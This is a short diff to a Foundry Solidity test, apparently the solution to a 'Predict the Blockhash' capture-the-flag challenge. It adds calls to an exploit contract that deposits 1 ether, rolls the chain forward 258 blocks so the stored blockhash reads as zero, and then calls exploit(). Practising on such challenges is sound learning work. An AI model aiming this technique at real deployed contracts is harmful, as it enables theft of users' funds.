@@ -21,7 +21,9 @@ contract PredictTheBlockhashTest is Test {
         uint256 blockNumber = block.number;
         // To roll forward, add the number of blocks to blockNumber,
         // Eg. roll forward 10 blocks: blockNumber + 10
-        vm.roll(blockNumber + 10);
+        exploitContract.callMeFirst{value: 1 ether}();
+        vm.roll(blockNumber + 258);
+        exploitContract.exploit();
 
         // Put your solution here
 
